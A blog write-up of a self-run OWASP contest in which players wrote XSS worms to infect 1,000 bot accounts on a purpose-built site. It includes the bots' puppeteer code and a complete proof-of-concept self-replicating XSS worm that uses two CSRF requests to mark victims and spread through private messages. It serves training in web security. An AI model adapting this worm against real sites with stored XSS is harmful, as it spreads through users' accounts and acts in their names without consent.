---
layout: post
title: "XSSworm.dev ~ Self-replication contest [write-up]"
date: 2020-12-01 00:00:00 -0000
categories: ['Ethical hacking', 'Tools']
tags: [XSS, worm]
author: vavkamil
---

tl;dr: I created "CTF" style challenge for our **[OWASP Czech Chapter Virtual Meeting](https://www.meetup.com/owasp-czech-republic-meetup-group/events/274616231/)**. The goal was to write an XSS worm and score points by infecting 1k virtual users. You can find the source code [here](https://github.com/vavkamil/XSSworm.dev) and read the details in this post.

---

When the whole covid-19 thing started, I was somehow interested in looking at various coronavirus world maps and watching the exponential growth of the pandemic unfold. It reminded me of the (in)famous MySpace; "[Samy worm](https://samy.pl/myspace/tech.html)" by [Samy Kamkar](https://en.wikipedia.org/wiki/Samy_Kamkar). For those of you who never heard about it, it was the first publicly released self-propagating cross-site scripting worm, onto MySpace, in 2005. The worm was able to infect over one million users had run the payload in one day.

Since then, we have seen some other XSS worms, for example, on Yahoo, Twitter or Orkut. But nothing at the scale of The MySpace worm.

In 2008, [@RSnake](https://twitter.com/rsnake?lang=en) published "*[Diminutive XSS Worm Replication Contest](https://web.archive.org/web/20080210014614/http://sla.ckers.org/forum/read.php?2,18790,18790)*" on sla.ckers.org. It was an awesome idea, but there was some [backlash](https://forums.theregister.com/forum/all/2008/01/05/worm_replication_contest/) as well :(

But why am I talking about this? Well, in 2008, I was 16 years old. I knew only the basic English, but I was lucky enough to be mentored by the best hackers in the Czechia at the time. Couple of months after the RSnake's contest, one member of our community took the idea and created an interface where we could test our XSS worms and compete with others. It looked like this:

![](/assets/img/2020/12/skola.png)

There were 200 bot accounts and we (~4 people) scored points by infecting them with our worms and marking them with our color & nick via CSRF. You can still find the pieces of the original web archived [here](https://web.archive.org/web/20080320190901/http://xsscontest.xf.cz/?action=stats&PHPSESSID=e8b6a4ab2a69f128ed44fa933bb7584e) and the XSS worm source [here](https://web.archive.org/web/20080717202916/http://skola.security-portal.cz/[4194]-XSS-CONTEST-WARRIOR_0x13.txt). It may sound weird, but this "contest", writing XSS worms and payloads to steal cookies, is one of my happiest childhood memories :)

So one evening, when I was checking the coronavirus map, I had a big flashback and immediately started coding the remastered version. The things is, I'm not a developer, so it took quite some time. In May 2020, I had a working Proof of Concept, which looked like this:

![](/assets/img/2020/12/challenge-poc.png)

At that point, I realized that it's *scalable* and I might be able to pull it off and write a CTF style contest for our upcoming OWASP Czech Chapter meeting. I did some research and decided to go with a simple Python Flask application and a cluster of puppeteer workers for the bots.

Then the situation with covid got worse, and we had to postpone the OWASP meeting. We had to postpone multiple times and eventually cancel the whole thing because of the lockdown. On the bright side, I had plenty of time for coding and polishing. So how does it work?

![](/assets/img/2020/12/web.png)

It's somehow simple. The user will register with the nickname and team color. They are then presented with a simple interface to send messages to bots. But here is a catch, each user has a limit of 13 messages which could be sent. Based on the swagger documentation, they need to write the XSS worm, which will leverage two CSRFs. One to change the bot's color and the other to self propagate via the bot's unlimited private messages. The point of a limited number of messages is to force the users to design an efficient infection algorithm, which will spread exponentially.

There is a grid of 1k boxes, which helps to visualize the bots. If they are infected, and by whom. Users are scoring points by infecting and reinfecting the bots and marking them with their team color.

![](/assets/img/2020/12/example.png)

The puppeteer cluster is then reading the last received messages of each bot in a random sequence every X minutes. The cluster code looks like this, it's just going through the array in random order, authenticated with cookies:

```
const { Cluster } = require('puppeteer-cluster');

(async () => {
  const cluster = await Cluster.launch({
    concurrency: Cluster.CONCURRENCY_CONTEXT,
    maxConcurrency: 5,
    // puppeteerOptions: { headless: false },
    // puppeteerOptions: { args: ['--no-sandbox'] },
    timeout: 666,
    monitor: true,
  });

  await cluster.task(async ({ page, data }) => {
    const { url, id } = data;
    await page.setCookie({
      'value':id,
      'domain': 'xssworm.dev',
      'expires': Date.now() / 1000 + 10,
      'name': '31p475~Yr37748-35r0h~7c3rr0C-ID',
      'httpOnly': true
    });
    await page.setCookie({
      'value':'correct-horse-battery-staple',
      'domain': 'xssworm.dev',
      'expires': Date.now() / 1000 + 10,
      'name': 'secret',
      'httpOnly': true
    });
    await page.goto(url);
    await page.waitFor(666);
    //const screen = await page.screenshot();
    // Store screenshot, do something else
  });

  var array = Array.from({length: 1001}, (_, i) => [i, Math.random()]).sort((a, b) => a[1] - b[1]).map(([n, r]) => n)
  for (var i = 0; i < array.length; i++) {
    //console.log(array[i]);
    var url = "https://xssworm.dev/read-message?id="+array[i];
    cluster.queue({url, id:""+array[i]+""});
  // many more pages
  }

  await cluster.idle();
  await cluster.close();
})();
```

There are some basic rules for users. They should be able to write the self-propagating code in just 13 tries. Once their worm hits exponential growth, they should be able to infect most of the victims.

![](/assets/img/2020/12/rules.png)

After the registration, users are presented with [Swagger documentation](https://editor.swagger.io/?url=https://raw.githubusercontent.com/vavkamil/XSSworm.dev/main/static/swagger.yaml). They were supposed to write a code, which will send two POST requests, one to change to the color of the victim, the other to replicate its code and spread to another victim. The tricky part was *application/x-www-form-urlencoded*, as most of the contestants struggled to get the encoding right, so either the '+' sign was stripped, or the '#' representing hex value of the color was double encoded.

![](/assets/img/2020/12/swagger.png)

Only one player was able to write the functional self-spreading XSS worm in time and eventually won the whole competition. They designed three different algorithms, as they could register again and resend the updated version to 13 victims.

![](/assets/img/2020/12/interface.png)

There is a lot of things to improve in my code. I used a rather strict Content Security Policy. The whole deployment should be in docker. I was even thinking about implementing CSRF tokens and Twitter OAuth. For more experienced users, XSS protection to bypass would be ideal. The one thing that I struggled with the most was how to prevent a race condition and how to protect the number of messages that the user can send :( But anyway, I'm glad that people enjoyed the challenge, even in those hard times.

Here you can check my Proof of Concept of the worm:

```
<script id="xss_worm">

	// XSS worm .dev
	// Self-replication contest
	// Proof of Concept v1.0

	var victims = 1000;
	var team_color = "#550bb1";
	var url = "https://xssworm.dev";
	var infection_code = "<script id=\"xss_worm\">"+self_propagation()+"<\/script>";

	infect_victim(team_color);

	while (true) {
		var victim_id = get_random_victim(victims);
		spread_infection(victim_id,infection_code);
	}

	function get_random_victim(accounts_count) {
		return Math.floor((Math.random() * accounts_count) + 1);
	}

	function infect_victim(color) {
		var xhr = new XMLHttpRequest();
		var params = "color="+color;
		xhr.open("POST", url+"/update", true);
		xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		xhr.send(params);
	}

	function self_propagation(){
		return document.getElementById("xss_worm").innerHTML;
	}

	function spread_infection(id,infection_code) {
		var xhr = new XMLHttpRequest();
		var params = "id="+id+"&msg="+encodeURIComponent(infection_code);
		xhr.open("POST", url+"/send-message", true);
		xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		xhr.send(params);
	}

</script>
```

You can check and try [the website](https://xssworm.dev), as I will keep the infrastructure alive for a while, or you can deploy it locally, as the whole thing is open-source. I'm a little bit ashamed of my programming skills, but here you go: [https://github.com/vavkamil/XSSworm.dev](https://github.com/vavkamil/XSSworm.dev)
